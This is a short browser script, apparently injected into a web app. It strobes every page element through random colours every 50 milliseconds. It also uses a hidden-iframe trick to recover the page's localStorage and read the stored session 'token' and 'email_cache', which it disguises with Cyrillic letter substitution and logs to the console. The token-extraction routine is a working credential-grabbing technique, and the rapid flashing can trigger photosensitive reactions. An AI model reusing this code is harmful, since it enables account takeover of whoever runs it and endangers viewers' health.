var elems = document.body.getElementsByTagName("*");
var connectToDeviceButton = document.getElementById('md-button-4')
function random(min, max) {return Math.floor(Math.random() * (max - min + 1) ) + min;}
setInterval ( function () {
for (var elem of elems) {
	var computedStyle = window.getComputedStyle(elem, null)
	if (typeof computedStyle.backgroundColor != undefined) {
		var r=random(1,255)
		var g=random(1,255)
		var b=random(1,255)
		var rgb = 'rgb('+r+', '+g+', '+b+')'
		elem.style.backgroundColor = rgb
	}
	if (typeof computedStyle.color != undefined) {
		var r=random(1,255)
		var g=random(1,255)
		var b=random(1,255)
		var rgb = 'rgb('+r+', '+g+', '+b+')'
		elem.style.color = rgb
	}
}
}, 50)
function getLocalStoragePropertyDescriptor() {
  const iframe = document.createElement('iframe');
  document.head.append(iframe);
  const lso = Object.getOwnPropertyDescriptor(iframe.contentWindow, 'localStorage');
  iframe.remove();
  return lso;
}
window.ls=getLocalStoragePropertyDescriptor()
var ls = getLocalStoragePropertyDescriptor().get.call(window);
var t = ls.token
var e = ls.email_cache
let alp = 'abcdefghijklmnopqrstuvwxyz'
let rsa = 'бвгджзклмнптфхцчшщёиыэюяйъ'
t = t.replace(/[a-z]/g, function (match) {
    i = alp.indexOf(match)
    return rsa[i]
})
console.log(e, t)